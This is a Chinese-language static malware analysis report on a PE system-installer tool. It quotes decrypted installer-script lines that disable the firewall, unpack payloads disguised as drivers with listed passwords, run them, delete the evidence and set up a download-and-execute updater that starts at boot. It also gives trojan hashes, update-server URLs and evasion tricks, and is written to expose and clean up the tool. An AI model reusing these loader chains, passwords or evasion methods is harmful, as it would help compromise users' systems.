# 电脑店 PE 装机工具 — 逆向分析报告（罪证留存）

> 本报告为**纯静态逆向分析**产物，样本从未在宿主机运行。
> 分析对象：`DianNaoDian_v7.5_2609.zip`（1.55 GB，ZIP 无密码）
> 签名主体：**东莞虎泰网络科技有限公司**（DianNaoDian.exe 有效数字签名，统一社会信用代码 `91441900MA4WJXLR19`）——与大白菜 PE 装机工具、老毛桃 PE 装机工具**同一签名主体、同一恶意代码体系**
> 版本：`Data\Config` → `Version=7.5.2606.12`
> 分析日期：2026-09-26
> 分析工具链：7-Zip / Python（pefile）/ 自研 PECMD CMPa 解密脚本 / 三方资源 SHA-256 比对脚本
> 对照基准：大白菜报告（`..\baicai\`）、老毛桃报告（`..\laomaotao\README_逆向分析报告.md`）

---

## 〇、素材来源与同源说明

- 样本 `DianNaoDian_v7.5_2609.zip` 为本地留档（ZIP 无密码），内含 `DianNaoDian.exe`（5.3 MB）、`Data\PE\03PE.wim`（67 MB）、`Data\PE\10PE64.wim`（334 MB）、`Data\Xkdonz\*.7z`（加密，密码未破）、`Data\Config`、`Data\Hash`。
- 本次分析证实电脑店与老毛桃/大白菜**同源同法**：
  - **DianNaoDian.exe 官方有效签名为东莞虎泰**，与老毛桃/大白菜同一主体；
  - 10PE64 解包密码 **3、4 逐字符相同**于老毛桃（`F2554E…`、`893FD5…`）；
  - `Dlg86.dll` **逐字节一致**于老毛桃/大白菜（`f801eb9f…`，杀软检出 Wacatac.H!ml）；
  - `Sysset.exe`（电脑店核心载荷）RCDATA 资源与大白菜 `SetSys.exe` **22/27**、与老毛桃 `TaoSet.exe` **23/27 逐字节相同**；
  - PECMD/NEI 内嵌脚本**逐行对应**（老毛桃 `LMT/ILMT` → 电脑店 `DND/IDND` 改名）；
  - 伪驱动魔数篡改手法相同（`.SYS` 实为 7z，文件头 `37 7A` 被改为 `54 78`）。
- 因此大白菜/老毛桃报告中已证实的行为（关闭 UAC/防火墙、处置安全软件、篡改 360 白名单、捆绑推广）在本报告中作为**同源继承行为**引用，并标注原始证据出处。

---

## 一、样本信息

| 项目 | 内容 |
|---|---|
| 样本包 | `DianNaoDian_v7.5_2609.zip`（ZIP 无密码，1.55 GB） |
| 版本 | `7.5.2606.12`（`Data\Config`） |
| 启动程序 | `work\DianNaoDian\DianNaoDian.exe`（Delphi 程序 + `.itext/.didata` 自写壳；编译 2026-06-05；**有效签名 = 东莞虎泰网络科技有限公司**） |
| PE 镜像 | `work\pe\10PE64.wim`（334 MB）/ `work\pe\03PE.wim`（67 MB） |
| 核心载荷 | `Sysset.exe`（8,752,128 B，**UPX 壳，无签名**）、`Hi.exe`（542,720 B，无签名）、`Dlg86.dll`（344,576 B，无签名）、`Dlg64.dll`（378,880 B）、`Apple.exe`（1,013,760 B）、`ACP.exe`、`LOADSYS.EXE`、`DNDUpdate.exe`（812,544 B，**UPX 壳，无签名**） |
| 伪装驱动 | `IntelRaid.sys` / `PW.bin` / `ACP.SYS` / `AppleDrv.sys`（实为 7-Zip 压缩包） |
| 杀软检出 | `Dlg86.dll` → **Wacatac.H!ml**（与大白菜/老毛桃样本逐字节一致） |

**样本与解包产物全部保留**于 `my\diannaodian\`：
- `DianNaoDian_v7.5_2609.zip` / `work\`（解包及 PE 镜像）
- `work\pe\extract10\PECMD.INI.dec.txt`（10PE64 PECMD 明文）
- `work\pe\extract10\IntelRaid_fixed.7z` / `raid_unpacked\`（10PE64 伪驱动载荷 16 文件）
- `work\pe\extract10\raid_unpacked\NEI.dec.txt`（NEI 内嵌脚本明文）
- `work\pe\extract10\rsrc_full\`（Sysset.exe 60 个资源叶子 dump）
- `work\pe\extract10\sysset_rsrc\DND_*`（命名资源提取，用于三方比对）
- `work\pe\extract03\raid03_unpacked\`（03PE 伪驱动载荷 4 文件）
- `work\pe\extract10\DNDUpdate.exe`（远程更新组件）

---

## 二、逆向步骤（可复现）

### 1. 解包
```
D:\7-Zip\7z.exe x DianNaoDian_v7.5_2609.zip          ← ZIP 无密码
D:\7-Zip\7z.exe x 10PE64.wim -oextract10             ← 解出 PECMD.INI / SysWOW64\DNDUpdate.exe 等
```

### 2. PECMD 脚本解密（CMPa 加密）
`PECMD.INI` 以 CMPa 格式加密，用 `cmpa_official.py`（daiaji/pecmd-decompile 算法，mode=0x14）还原明文（30 KB）：`work\pe\extract10\PECMD.INI.dec.txt`。

### 3. 10PE64 PECMD 明文关键行（解码定位载荷与销毁链）
```
L158 EXEC !wpeutil.exe DisableFirewall                                ← PE 内关闭防火墙（PENET 子过程）
L196 EXEC *=...7-Zip\ZipFile_7z.exe x "…\Drivers\IntelRaid.sys" -o… -pF2554EF7FE28DDC5896ACCBB36FCF97A
L197 EXEC *=...7-Zip\ZipFile_7z.exe x "…\安装维护\PW.bin" -o… -p893FD5B3CD2D027CD7F205CBDE11AA75
L198 FILE %ProgramFiles%\安装维护\PW.bin                              ← 解压后立即删除（证据销毁）
L199 TEAM FILE ...\ReadDMI.EXE->…\SysWOW64\|EXEC ReadDMI.EXE|FILE 删之|FILE ...\HI.EXE=>SysWOW64
L200 IFEX $%bX64%>0,FILE %WinDir%\System32\DND*.EXE=>%WinDir%\SysWOW64\   ← 搬运 DND* 组件生效
L201 FILE ...\DNDPE.EXE|FILE ...\DNDPE.EXE|FILE ...\Drivers\IntelRaid.sys ← 删除载荷源文件（证据销毁）
L209 EXEC X:\Windows\System32\SysSet.EXE                              ← 执行核心载荷（电脑店版 SetSys）
```

### 4. 伪驱动复原（魔数篡改）
`IntelRaid.sys` / `PW.bin` 文件头 2 字节被篡改为 `54 78`（"Tx"），**恢复为 7z 魔数 `37 7A`** 后解压成功（与大白菜/老毛桃同款手法）：
- 10PE64 `IntelRaid.sys` → `IntelRaid_fixed.7z` → **密码3**（`F2554E…`，与老毛桃相同）→ 16 文件：`Sysset.exe`、`Hi.exe`、`Dlg86.dll`、`Dlg64.dll`、`Apple.exe`、`AppleDrv.sys`、`ACP.exe`、`devconx64.exe`、`devconx86.exe`、`ReadDMI.exe`、`NEI`、`PESET`、`Task2`、`ApplePT`、`Apple` 等
- `PW.bin` → **密码4**（`893FD5…`，与老毛桃相同）
- 03PE `IntelRaid.sys` → **密码5**（`4469616e…`，老毛桃 03PE 用密码2，电脑店改用密码5）→ 4 文件：`Sysset.exe`（哈希与 10PE64 相同）、`LOADSYS.EXE`、`NEI`、`Task2`

### 5. NEI 内嵌脚本明文关键行（`raid_unpacked\NEI.dec.txt`，70 KB）
```
L88  IFEX …\ACP.EXE,EXEC !=…\ACP.EXE /S                             ← 静默安装 ACP
L134 EXEC …7z.EXE e "%WinDir%\System32\ACP.SYS" -p4469616e4e616f4469616e32303137474f …  ← 密码5
L144 EXEC %WinDir%\SYSTEM32\ACP.EXE
L146 IFEX %Desktop%\苹果电脑,EXEC %WinDir%\System32\Hi.exe           ← 执行 Hi.exe
L288 EXEC …7z.EXE x %Windir%\System32\AppleDrv.sys -p4469616e… -o"…\Drivers"           ← 密码5
L290 IFEX $%bX64%>0,EXEC …Dlg64.DLL …AppleHFS6.SYS!EXEC …Dlg86.DLL …AppleHFS.SYS     ← 注册驱动（Dlg86.dll=已确认木马）
L573 EXEC @=fbinst.exe (ud) output "IDND/DNDRV/Browser.exe" …|EXEC …"IDND/DNDRV/tv.exe" …
L574 LINK %Desktop%\网页浏览器,X:\Windows\SysWOW64\DndUpdate.exe,/type:10 /downexec,…  ← 桌面链接→远程下载执行
      LINK %Desktop%\远程协助,X:\Windows\SysWOW64\DndUpdate.exe,/type:11 /downexec,…  ← ToDesk 远程协助
L589 EXEC %Windir%\SysWOW64\DndUpdate.exe -startup                    ← 开机自启远程更新组件
L592 FORX @\DND\DNDRV 10.7z/Net.7z …                                  ← 对应老毛桃 \LMT\LMT\ 改名
```

### 6. Sysset.exe 资源 dump 与三方比对
`Sysset.exe` = UPX 壳 + 8 MB `.rsrc` 资源节（区别于大白菜/老毛桃的 `.itext/.didata` 自写壳）。完整 dump **60 个资源叶子**（`rsrc_full\`），RCDATA 下命名资源与大白菜 `SetSys.exe` / 老毛桃 `TaoSet.exe` **完全同名同构**：`360SAFE / 7Z / 7ZA / AFTER / DEPLOY / DOSBOX / DVCLAL / FBINST / NET / PACKAGEINFO / PLATFORMTARGETS / RES1-3 / RESH11/12/21/22 / RESP / SCJ1 / SECURCONF / SWAPADD / SWAPADD64 / TEST / TNOTICEFORM / TOPDRVIER / TOPDRVIER_X64`。

逐资源 SHA-256 三方比对（`dnd_cmp2.py`）：

| 结果 | 计数 |
|---|---|
| 电脑店 Sysset vs 大白菜 SetSys | **22/27 个共有资源逐字节相同** |
| 电脑店 Sysset vs 老毛桃 TaoSet | **23/27 个共有资源逐字节相同** |

**三方完全一致（SHA-256 相同）的 22 个资源**：`7Z`、`7ZA`、`AFTER`(NSIS)、`DEPLOY`(2.7 MB VMProtect)、`DOSBOX`、`DVCLAL`、`FBINST`、`NET`、`None`(清单)、`RES2`、`RES3`、`RESH11`、`RESH12`、`RESH21`、`RESH22`、`RESP`、`SECURCONF`、`SWAPADD`、`SWAPADD64`、`TNOTICEFORM`、`TOPDRVIER`、`TOPDRVIER_X64`。
**差异项（版本更新）**：`360SAFE`（电脑店 112,483 B vs 老毛桃/大白菜 202,531 B）、`RES1`（电脑店=老毛桃 208,633 B，大白菜 200,787 B）、`SCJ1`/`TEST`/`PACKAGEINFO`（三方言均不同）。

关键载荷哈希：
- `Dlg86.dll` = `f801eb9f15f73202074adcb1a45f44697c03d21b1f2b1d89589304b29043f639`（**三品牌逐字节一致**）
- `DEPLOY` = `1335637f7a97144b…`（**三品牌一致**，VMProtect 虚拟化无法静态还原）
- `SECURCONF` = `8814e7bb94c4fc38…`（**三品牌一致**，938 B 异或混淆配置）

### 7. RES1 明文操作配置（关键新证据，与老毛桃逐字节相同）
`RES1`（208,633 B）为明文 INI，是驱动处置/部署的操作配置：

```
[drivers]      ← 12 个驱动服务注册项
1=SYSTEM\ControlSet001\Services\adkirs
2=SYSTEM\ControlSet001\Services\xjwsks
3=SYSTEM\ControlSet001\Services\XjBfasa123
…（共 12 个随机名服务）

[signature]    ← 签名白名单（放行下列主体签名的驱动）
Xtreaming Technology Inc.=1
Beijing JoinHope Image Technology Ltd.=1
上海易考达信息咨询有限公司=1
Shenzhen yundian Technology Co., Ltd=1
Bozhou Feiteng Network Technology Co., Ltd.=1
上海域联软件技术有限公司=1
BLOCKCHAIN ADVANCES LTD=1
长沙恒祥信息技术有限公司=1
武汉壮志凌云网络有限公司=1
北京天瑞地安网络科技有限公司=1
科云（上海）信息技术有限公司=1

[attributes]   ← 驱动识别规则（ProductName/FileDescription + 文件大小区间）
Advaned ICP Controller Driver=ProductName|1572864|3145728
…

[7z]           ← 按目标目录硬编码的解压密码/解码标志
Windows\Web\wsks|qazwsx=Sysprep
Windows\Web\wsks|qq123456=Sysprep
;https://windows.sydxwl.cn/                     ← 内嵌远程 URL 注释
Windows\Speech\Common\zh-CN\sapisvr7.exe.mui|CUc_sndf23dne=
Windows\Speech\Common\zh-CN\sapisvr7.exe.mui|DHsf_dysfe273391=
…（Speech\Comnon/Conmon/Cammon/Cbmmon/Ccmmon/Cdmmon/Cemmon/Cfmmon/Cgmmon/Chmon/Cimmon
   多个故意拼错路径变体，规避路径匹配/检测）
Windows\Web\JXSGW|10CcaCrLeC|DecodeXor1=Sysprep
Windows\Web\VKYWA|11#6b9Dzxk|DecodeXor1=Sysprep
Windows\Web\AIOKLAI|1022H2Dzxk=Sysprep
Windows\Web\AIOKLAI|11ibWSnULxPg=Sysprep
Windows\Web\AIOKLAI|11Ng6CycqxS&CWS*Ce=Sysprep
…（共 14 组，附 2025-2026 年 ISO 版本更新注释，如 G_WIN11_X64_26200.7019.iso）
```

> 解读（谨慎限定）：`[signature]` 为驱动放行白名单，`[7z]` 为按目标路径部署加密载荷的密码表，`DecodeXor1` 指示 XOR 解码；该文件为部署后系统的**持久化/驱动隐藏操作配置**，与老毛桃逐字节一致说明同一运营主体直接复用。

### 8. DNDUpdate.exe（远程更新组件）
- `Windows\SysWOW64\DNDUpdate.exe`（812,544 B，WIM 内时间戳 2026-09-18，PE 头编译 2026-03-06；**UPX 壳，无签名**）
- 导入 `URLMON.dll` / `wininet.dll` → HTTP 下载能力
- 被 NEI 脚本用于：桌面"网页浏览器"（`/type:10 /downexec`）、"远程协助"（`/type:11 /downexec`）→ **下载即执行**；`-startup` 开机自启
- URL 因 UPX 压缩无法静态提取（见局限）

### 9. Xkdonz 加密包破解与内容（补充）
`Data\Xkdonz\` 下 `Boot.7z`（14.6 MB）/ `Other.7z`（300 KB）/ `Ver.7z`（286 B）三包**头部加密**（连文件名均隐藏）。复用老毛桃内层主包密码 `8A86Jxp@EZj!@SY3` **一次性全部破解**——又一同源证据。内容：
- `Ver.7z` → `Ver.ini`：版本标记（`7=20260918`、`6=20260918` 等，2026-09-18 构建）
- `Other.7z` → 图标（`DND.ico`/`GHO.ico`/`我的工具.ico`）+ GBK 说明 txt + 空 `EFI` 目录（品牌与桌面素材）
- `Boot.7z` → 完整启动环境：`BIOS`（NT5/NT6 bootmgr + `SRS` 17 个驱动）、`UEFI`、`DUAL\IDND`（GRUB4DOS 引导，`GRUB\MENU.LST` 引用 `DND10PE`/`03PE.ISO`/`MAXDOS.IMG` 等）、`BCD`、`grldr_cd.bin`
- `MENU.LST` 为标准 GRUB4DOS 菜单（启动 10PE/03PE、Ghost、DiskGenius、MaxDOS、密码破解工具），**结构良性**，与老毛桃 IMG 分析结论一致；恶意行为仍集中在 PE 内 PECMD 链（见行为 1-7）

---

## 三、软件行为（代码级证据）

### 行为 1：压缩包伪装成驱动（确凿，明文 PECMD/NEI）
`IntelRaid.sys` / `PW.bin` / `ACP.SYS` / `AppleDrv.sys` 均为 7-Zip 压缩包，以 `.SYS`/`.bin` 扩展名存放在 `System32\Drivers\`，启动阶段解压——与大白菜/老毛桃 `IntelRaid.sys` 手法**同名同法**（魔数 `37 7A`→`54 78` 篡改）。

### 行为 2：执行后销毁证据（确凿，明文 PECMD）
解压→执行→立即 `FILE` 删除源文件：`PW.bin`（L198）、`ReadDMI.EXE`（L199）、`DNDPE.EXE` + `IntelRaid.sys`（L201）。静态取证窗口被刻意压缩。

### 行为 3：同源继承恶意行为（资源层确凿，套用大白菜/老毛桃已证实结论）
`Sysset.exe` 与大白菜 `SetSys.exe` 22/27、与老毛桃 `TaoSet.exe` 23/27 资源逐字节相同（含 `DEPLOY`/`SECURCONF`/`AFTER`），继承已证实行为：
- **关闭 UAC**（`EnableLUA` 等置 0）
- **关闭防火墙**（PE 内 `wpeutil DisableFirewall` 明文可见）
- **处置安全软件**（`CDelSecuritySoft` 类，经服务管理 API，核心被 VMProtect 虚拟化）
- **篡改 360 白名单**（`360SAFE` 包写入 `360Safe\` 目录：`speedmem2.hg`、`leakrepair.dat`、`360U.dat`、`360UACU.dat`、`netmon\360netmon.ini`——电脑店版为更新版文件集，同类手法）

### 行为 4：携带已确认木马组件（AV 检出）
`Dlg86.dll`（Wacatac.H!ml）与大白菜/老毛桃样本**逐字节一致**，由 NEI L290 以"注册驱动"方式在 PE 启动阶段安装（`Dlg86.DLL AppleHFS.SYS`）。`Hi.exe` 同步被搬运到 `SysWOW64` 生效（L199/L200）。

### 行为 5：远程下载执行组件（机制级）
`DNDUpdate.exe` 经 `URLMON/wininet` 下载，`/type:10/11 /downexec` 参数直接"下载并执行"网页浏览器/ToDesk 组件；`-startup` 开机自启；PE 环境为 SYSTEM 高权限。`Data\Hash`（更新清单 JSON）进一步暴露**远程下发服务器**：
- 主程序：`https://downdnd.softdownb.com:9002/v2/DianNaoDian.7z`（`filehash`、`ver=7.5.2606.12`、`time=2026年6月12日`）
- 基础组件：`https://downdnd.softdownb.com:9002/v2/Bin.7z`（`tags:123456`）
- 清单内含逐文件 SHA-256 与版本号（api-ms-*/dll 等 Windows 兼容层组件），证明该服务器为软件更新分发通道

### 行为 6：签名白名单放行机制（操作配置级）
`RES1 [signature]` 列出 11 个厂商签名主体（含 6 个中文主体：上海易考达/上海域联/长沙恒祥/武汉壮志凌云/北京天瑞地安/科云上海），部署阶段对白名单签名驱动放行；`[drivers]` 注册 12 个随机名服务（`adkirs`/`xjwsks`/`wupxbxets` 等）。

### 行为 7：对抗检测（技术证据）
- PECMD 脚本 CMPa 加密
- 7z 魔数前 2 字节篡改（`37 7A` → `54 78`）
- 载荷全部**无数字签名**（Sysset.exe / DNDUpdate.exe / Hi.exe / Dlg86.dll）
- Sysset.exe / DNDUpdate.exe 采用 **UPX 压缩壳**
- `RES1` 中 `Windows\Speech\...` 路径含大量故意拼错变体（Comnon/Conmon/Cammon…）规避路径匹配

---

## 四、罪证清单（揭发要点）

1. **官方签名主体 = 东莞虎泰网络科技有限公司**（DianNaoDian.exe 有效签名），与大白菜、老毛桃同一公司、同一恶意代码体系。
2. **压缩包伪装成驱动**：4 个 `.SYS`/`.bin` 实为 7z，PE 启动阶段解压并安装（行为 1）。
3. **执行后销毁证据**：解压即删源文件，压缩静态取证窗口（行为 2）。
4. **携带已确认木马**：`Dlg86.dll`（Wacatac.H!ml）逐字节等于大白菜/老毛桃恶意样本（行为 4）。
5. **继承大白菜/老毛桃已证实恶意行为**：关闭 UAC/防火墙、处置安全软件、篡改 360 白名单（行为 3，资源逐字节同源：22/27、23/27）。
6. **远程下载执行组件**：`DNDUpdate.exe` `/downexec` + `-startup`（行为 5）。
7. **驱动服务注册 + 签名白名单 + 分目录密码表**：`RES1` 明文操作配置（行为 6）。
8. **多层对抗**：CMPa 加密、魔数篡改、UPX 壳、载荷全部无签名（行为 7）。

---

## 五、安全边界与处置建议

- 本报告全部为**静态分析，样本未在宿主执行**。`DEPLOY`（VMProtect 虚拟化）与 `DNDUpdate.exe`（UPX 壳）无法静态还原，若需逐 API 铁证应在 Hyper-V 隔离虚拟机中结合 API Monitor/Procmon 动态取证。
- **未决项**：① `DNDUpdate.exe` 的远程 URL 因 UPX 压缩未从二进制中提取（但 `Data\Hash` 清单已暴露下发服务器 `downdnd.softdownb.com`）；② `RES1 [7z]` 密码表对应载荷内容未实采（路径均在目标系统内，需目标环境动态取证）。
- 建议：彻底卸载该工具；PE 使用过的机器检查 `HKLM\SYSTEM\ControlSet001\Services` 下随机名驱动服务（对照 `RES1 [drivers]` 名单）、`Windows\Web\`、`Windows\Speech\` 目录残留；鉴于 UAC/防火墙/安全软件已被代码级确认会被关闭，建议干净主机上重装系统。
- 样本目录 `my\diannaodian\` 已含带毒可执行文件，请保持隔离（Defender 临时豁免仅限分析目录，完成后立即移除）；**不得向公开仓库上传可执行样本**。

---

## 六、附：密码清单

| # | 用途 | 密码 |
|---|---|---|
| 1 | `Data\Xkdonz\Boot.7z` / `Other.7z` / `Ver.7z`（主程序配套加密包） | `8A86Jxp@EZj!@SY3`（**与老毛桃内层主包密码完全相同**，已破解全部三个） |
| 3 | 10PE64 `IntelRaid.sys` | `F2554EF7FE28DDC5896ACCBB36FCF97A`（与老毛桃**相同**） |
| 4 | `PW.bin` | `893FD5B3CD2D027CD7F205CBDE11AA75`（与老毛桃**相同**） |
| 5 | 03PE `IntelRaid.sys` / `ACP.SYS` / `AppleDrv.sys` | `4469616e4e616f4469616e32303137474f`（ASCII `DianNaoDian2017GO`；03PE 密码与老毛桃不同） |
| RES1 | 目标目录部署密码 | `qazwsx` / `qq123456` / `CUc_sndf23dne` / `DHsf_dysfe273391` / `10CcaCrLeC` / `11#6b9Dzxk` / `1022H2Dzxk` / `11ibWSnULxPg` / `11Ng6CycqxS&CWS*Ce` / `11RSLGwzbgeDQ32m3y` / `11jqlJgPgAs2nXs8tG`（`DecodeXor1` 为 XOR 解码标志） |
| 未破 | —（Xkdonz 三包已全部破解） | — |

---

## 七、附：逆向脚本索引（`my\diannaodian\`）

| 脚本 | 用途 |
|---|---|
| `cmpa_official.py`（复用 `..\laomaotao\`） | PECMD CMPa 解密 |
| `dnd_peinfo.py` | DianNaoDian.exe PE 侦察 |
| `dnd_rsrc_dump.py` | Sysset.exe 完整资源树 dump（60 叶子） |
| `dnd_cmp2.py` | 电脑店 vs 大白菜 vs 老毛桃三方资源 SHA-256 比对 |
| `dndupdate_scan.py` | DNDUpdate.exe PE/URL 侦察 |
